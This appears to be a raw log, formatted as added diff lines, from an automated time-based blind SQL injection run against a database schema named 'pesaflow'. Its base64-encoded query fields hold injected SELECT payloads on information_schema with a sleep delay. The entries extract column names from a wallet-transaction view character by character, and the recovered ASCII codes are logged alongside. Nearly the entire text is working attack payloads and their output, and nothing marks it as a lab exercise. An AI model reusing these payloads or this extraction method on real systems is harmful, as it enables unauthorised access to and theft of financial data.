QUERY","tb":"74","cl":"2","lngth":12,"charpos":8,"ttcm":"4","f":"C","pr":"NjUtMTEyLTExMi0xMDgtMTA1LTk5LTk3","query":"eyJjaGFycG9zIjo4LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAxKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjEyOjUyOjU1In0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"2","lngth":12,"charpos":9,"ttcm":"4","f":"C","pr":"NjUtMTEyLTExMi0xMDgtMTA1LTk5LTk3LTExNg==","query":"eyJjaGFycG9zIjo5LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAxKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjEyOjUzOjIwIn0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"2","lngth":12,"charpos":10,"ttcm":"4","f":"C","pr":"NjUtMTEyLTExMi0xMDgtMTA1LTk5LTk3LTExNi0xMDU=","query":"eyJjaGFycG9zIjoxMCwicGFyYW0iOiIoU0VMRUNUKENPTFVNTl9OQU1FKUZST00oaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMpV0hFUkUodGFibGVfc2NoZW1hPSdwZXNhZmxvdydBTkQodGFibGVfbmFtZT0ndnd0b2RheXdhbGxldHRyeCcpKU9SREVSJTIwQlkoQ09MVU1OX05BTUUpTElNSVQlMjAxJTIwT0ZGU0VUJTIwMSkiLCJ0YXJnZXQiOjEsInNsZWVwIjo1LCJzX3RpbWUiOiIxMjo1Mzo0MCJ9"}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"2","lngth":12,"charpos":11,"ttcm":"4","f":"C","pr":"NjUtMTEyLTExMi0xMDgtMTA1LTk5LTk3LTExNi0xMDUtMTEx","query":"eyJjaGFycG9zIjoxMSwicGFyYW0iOiIoU0VMRUNUKENPTFVNTl9OQU1FKUZST00oaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMpV0hFUkUodGFibGVfc2NoZW1hPSdwZXNhZmxvdydBTkQodGFibGVfbmFtZT0ndnd0b2RheXdhbGxldHRyeCcpKU9SREVSJTIwQlkoQ09MVU1OX05BTUUpTElNSVQlMjAxJTIwT0ZGU0VUJTIwMSkiLCJ0YXJnZXQiOjEsInNsZWVwIjo1LCJzX3RpbWUiOiIxMjo1NDowMSJ9"}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"2","lngth":12,"charpos":12,"ttcm":"4","f":"C","pr":"NjUtMTEyLTExMi0xMDgtMTA1LTk5LTk3LTExNi0xMDUtMTExLTExMA==","query":"eyJjaGFycG9zIjoxMiwicGFyYW0iOiIoU0VMRUNUKENPTFVNTl9OQU1FKUZST00oaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMpV0hFUkUodGFibGVfc2NoZW1hPSdwZXNhZmxvdydBTkQodGFibGVfbmFtZT0ndnd0b2RheXdhbGxldHRyeCcpKU9SREVSJTIwQlkoQ09MVU1OX05BTUUpTElNSVQlMjAxJTIwT0ZGU0VUJTIwMSkiLCJ0YXJnZXQiOjEsInNsZWVwIjo1LCJzX3RpbWUiOiIxMjo1NDoyMSJ9"}65-112-112-108-105-99-97-116-105-111-110-99
+<br/>12:54:59<br/>Quering done!
+        
+    
+        
+[2023-05-25 12:55:16] {"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"1","lngth":9,"charpos":2,"ttcm":"4","f":"C","pr":"OTc=","query":"eyJjaGFycG9zIjoyLCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAwKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjEyOjUyOjA2In0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"1","lngth":9,"charpos":3,"ttcm":"4","f":"C","pr":"OTctOTk=","query":"eyJjaGFycG9zIjozLCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAwKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjEyOjUyOjIxIn0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"1","lngth":9,"charpos":4,"ttcm":"4","f":"C","pr":"OTctOTktOTk=","query":"eyJjaGFycG9zIjo0LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAwKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjEyOjUyOjM3In0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"1","lngth":9,"charpos":5,"ttcm":"4","f":"C","pr":"OTctOTktOTktMTEx","query":"eyJjaGFycG9zIjo1LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAwKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjEyOjUyOjU4In0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"1","lngth":9,"charpos":6,"ttcm":"4","f":"C","pr":"OTctOTktOTktMTExLTExNw==","query":"eyJjaGFycG9zIjo2LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAwKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjEyOjUzOjIzIn0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"1","lngth":9,"charpos":7,"ttcm":"4","f":"C","pr":"OTctOTktOTktMTExLTExNy01NA==","query":"eyJjaGFycG9zIjo3LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAwKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjEyOjUzOjU3In0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"1","lngth":9,"charpos":8,"ttcm":"4","f":"C","pr":"OTctOTktOTktMTExLTExNy01NC0xMTY=","query":"eyJjaGFycG9zIjo4LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAwKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjEyOjU0OjIwIn0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"1","lngth":9,"charpos":9,"ttcm":"4","f":"C","pr":"OTctOTktOTktMTExLTExNy01NC0xMTYtNzM=","query":"eyJjaGFycG9zIjo5LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAwKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjEyOjU0OjQ5In0="}97-99-99-111-117-54-116-73-68
+<br/>12:55:16<br/>Quering done!
+        
+    
+        
+[2023-05-25 12:57:22] {"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"3","lngth":9,"charpos":2,"ttcm":"4","f":"C","pr":"Njc=","query":"eyJjaGFycG9zIjoyLCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAyKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjEyOjU0OjE2In0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"3","lngth":9,"charpos":3,"ttcm":"4","f":"C","pr":"NjctMTE3","query":"eyJjaGFycG9zIjozLCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAyKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjEyOjU0OjM3In0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"3","lngth":9,"charpos":4,"ttcm":"4","f":"C","pr":"NjctMTE3LTExNQ==","query":"eyJjaGFycG9zIjo0LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAyKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjEyOjU0OjU5In0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"3","lngth":9,"charpos":5,"ttcm":"4","f":"C","pr":"NjctMTE3LTExNS0xMTY=","query":"eyJjaGFycG9zIjo1LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAyKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjEyOjU1OjIxIn0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"3","lngth":9,"charpos":6,"ttcm":"4","f":"C","pr":"NjctMTE3LTExNS0xMTYtMTEx","query":"eyJjaGFycG9zIjo2LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAyKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjEyOjU1OjQxIn0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"3","lngth":9,"charpos":7,"ttcm":"4","f":"C","pr":"NjctMTE3LTExNS0xMTYtMTExLTk1","query":"eyJjaGFycG9zIjo3LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAyKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjEyOjU2OjE5In0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"3","lngth":9,"charpos":8,"ttcm":"4","f":"C","pr":"NjctMTE3LTExNS0xMTYtMTExLTk1LTEwMQ==","query":"eyJjaGFycG9zIjo4LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAyKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjEyOjU2OjM0In0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"3","lngth":9,"charpos":9,"ttcm":"4","f":"C","pr":"NjctMTE3LTExNS0xMTYtMTExLTk1LTEwMS0xMTQ=","query":"eyJjaGFycG9zIjo5LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAyKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjEyOjU2OjU3In0="}67-117-115-116-111-95-101-114-115
+<br/>12:57:22<br/>Quering done!
+        
+    
+        
